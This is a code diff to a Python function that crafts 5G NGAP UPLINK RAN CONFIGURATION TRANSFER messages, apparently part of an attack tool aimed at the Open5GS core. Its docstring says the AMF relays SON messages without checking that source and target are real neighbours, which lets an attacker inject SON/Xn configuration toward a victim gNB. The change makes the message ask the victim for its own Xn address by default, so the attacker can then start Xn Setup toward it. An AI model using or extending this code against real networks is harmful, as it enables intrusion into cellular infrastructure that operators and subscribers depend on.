@@ -752,7 +752,7 @@ def uplink_ran_configuration_transfer(cfg: dict, *, target_gnb_id: int,
                                       target_gnb_id_len: int | None = None,
                                       source_gnb_id_len: int | None = None,
                                       xn_ip: str | None = None,
-                                      son: str = "reply"):
+                                      son: str = "request"):
     """UPLINK RAN CONFIGURATION TRANSFER (Class 2, procedureCode 48). Open5GS g09.
 
     Blind relay: the AMF forwards the carried SONConfigurationTransfer to the
@@ -760,13 +760,11 @@ def uplink_ran_configuration_transfer(cfg: dict, *, target_gnb_id: int,
     check that source/target are real neighbours -> inject SON/Xn config toward a
     victim gNB the attacker does not control.
 
-    Default `son='reply'`: TS 38.413 8.8.2.2 says the receiving NG-RAN may
-    *initiate Xn TNL establishment* when SON Information is a Reply carrying
-    XnTNLConfigurationInfo (the source / this tester, gNB 4660). A Request only
-    asks the target to *report its own* TNL; commercial gNBs that are not in a
-    state to answer that request send Error Indication (proc 9,
-    message-not-compatible-with-receiver-state). Pass son='request' to send the
-    old Request form.
+    Default `son='request'`: ask the target for *its* Xn TNL (SON Information
+    Request = xn-TNL-configuration-info). Spec also requires our own
+    xnTNLConfigurationInfo on that Request. If the target Replies via AMF, we
+    can then initiate Xn Setup toward the advertised address. Pass son='reply'
+    only when simulating an answer to a former request (peer-initiated Xn).
     """
     plmn = encode_plmn(cfg["mcc"], cfg["mnc"])
     tac_b = int(cfg["tac"] if tac is None else tac).to_bytes(3, "big")
@@ -778,7 +776,7 @@ def uplink_ran_configuration_transfer(cfg: dict, *, target_gnb_id: int,
     # sourceRANNodeID advertised to the peer uses 22 unless overridden.
     src_len = int(source_gnb_id_len if source_gnb_id_len is not None else 22)
     tnl = _xn_tnl_configuration_info(_xn_tnl_ip(cfg, xn_ip))
-    kind = (son or "reply").lower()
+    kind = (son or "request").lower()
     if kind == "request":
         son_info = ("sONInformationRequest", "xn-TNL-configuration-info")
     elif kind == "reply":
